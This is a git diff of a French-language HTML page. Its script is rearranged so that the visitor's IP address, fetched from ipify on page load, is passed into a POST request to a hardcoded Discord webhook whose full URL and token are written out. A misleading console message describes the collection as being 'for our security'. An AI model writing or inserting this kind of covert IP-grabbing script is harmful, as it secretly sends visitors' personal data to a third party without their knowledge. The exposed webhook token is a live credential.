@@ -20,13 +20,7 @@
 <a href="bug.html" class="bouton red">Sinalez un bug?</a><br/>
 
 <script>
-fetch('https://api.ipify.org?format=json')
-  .then(response => response.json())
-  .then(data => {
-    const userIP = data.ip;
-    console.log('Donnée récuperer pour notre séccurité.'); // affiche l'adresse IP de l'utilisateur dans la console
-  })
-  .catch(error => console.error(error));
+
 
 
 	var webhookURL = "https://discord.com/api/webhooks/1080821481027674122/3gdpd4BjDv1aFpWLZ36JxVpbNx2ZXdaBbmpVMISAzz8FKgT35i4B7eG39KXV1F1l1UR2";
@@ -34,7 +28,11 @@ fetch('https://api.ipify.org?format=json')
   // Préparer les données à envoyer
   
 
-
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const userIP = data.ip;
+    console.log('Donnée récuperer pour notre séccurité.'); // affiche l'adresse IP de l'utilisateur dans la console
   // Envoyer une requête POST à l'URL de Webhook
   fetch(webhookURL, {
     method: "POST",
@@ -50,6 +48,9 @@ console.log("Envoyer avec succès");
   .catch(error => {
     console.error("Erreur lors de l'envoi du message: ", error);
   });
+
+	  })
+  .catch(error => console.error(error));
 	  </script>
 	  
 </body>
